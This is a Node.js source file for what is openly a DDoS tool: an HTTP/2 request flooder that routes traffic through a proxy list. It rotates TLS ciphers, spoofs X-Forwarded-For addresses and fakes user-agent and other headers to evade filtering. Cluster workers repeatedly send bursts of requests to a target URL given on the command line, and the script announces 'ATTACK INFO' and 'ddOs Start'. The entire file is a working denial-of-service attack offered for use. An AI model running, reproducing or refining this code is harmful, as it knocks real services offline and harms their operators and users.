const url = require('url'),
http2 = require('http2'),
tls = require('tls'),
http = require('http'),
fs = require('fs'),
cluster = require('cluster'),
color = require('colors'),
randstr = require('randomstring'),
fakeua = require('fake-useragent'),
cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
],
accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
],
lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5'
],
encoding_header = [
    'deflate, gzip;q=1.0, *;q=0.5',
    'gzip, deflate, br',
    '*'
],
controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0'
],
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
     console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
     console.warn(e);
}).setMaxListeners(0);

function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
}

function proxyt() {
    return proxysobject[Math.floor(Math.random() * proxysobject.length)];
}

function cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
}

function forward(){
    return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
}

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min)) + min;
}

function Rstring(length){
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ){
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
  return result;
}

var requeteperip = 60;
var thread = 1;
var target;
var time;
var proxylist;

process.argv.forEach(arg => {

    if(arg.startsWith('rqp=')){
        
        requeteperip = arg.split('=')[1];

    }else if(arg.startsWith('thread=')){

        thread = arg.split('=')[1];

    }else if(arg.startsWith('target=')){

        target = arg.split('=')[1];

    }else if(arg.startsWith('time=')){

        time = arg.split('=')[1];

    }else if(arg.startsWith('proxys=')){

        proxylist = arg.split('=')[1];

    }

})

const proxysobject = fs.readFileSync(proxylist,'utf-8').toString().match(/\S+/g);


if(cluster.isMaster){

    console.log(`[!] ATTACK INFO`.rainbow)
    console.log(`${target} > ${time} > ${thread}`.rainbow)
    console.log(`ddOs Start`.rainbow)

    for(let z = 0;z<thread;z++){
        cluster.fork()
    }

}else{
    
    var parsed = url.parse(target);

    
        const uas = fakeua();

        var path = parsed.path

        path = path.replace('[rand]', Rstring(getRandomInt(12,30)))
    
        var header = {
            ":path": parsed.path,
            "X-Forwarded-For": forward(),
            ":method": "GET",
            "User-agent": uas,
            "Origin": target,
            "Accept": accept(),
            "Accept-Encoding": encoding(),
            "Accept-Language": lang(),
            "Cache-Control": controling(),
        }
    
    
    function flooder() {
    
    
        var cipper = cipher()

        var proxy = proxyt().split(':')
        
        var req = http.request({ 
            host: proxy[0],
            port: proxy[1],
            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
            method: 'CONNECT',
            path: parsed.host + ":443"
        }, (err) => {
            req.end();
            return;
        });
    
        req.on('connect', function (res, socket, head) { 
        
            const client = http2.connect(parsed.href, {
                createConnection: () => tls.connect({
                    host: parsed.host,
                    ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                    secureProtocol: 'TLS_method',
                    servername: parsed.host,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    socket: socket
                }, function () {
                    for (let i = 0; i< requeteperip; i++){
                        const req = client.request(header);
                        req.setEncoding('utf8');
                        req.on('data', (chunk) => {
                            // data += chunk;
                        });
                        req.end();
                        req.on("response", () => {
                            req.close();
                        })
                    }
                })
            });
        });
        req.end();
    }
    
    setInterval(() => { flooder() }, 5)

}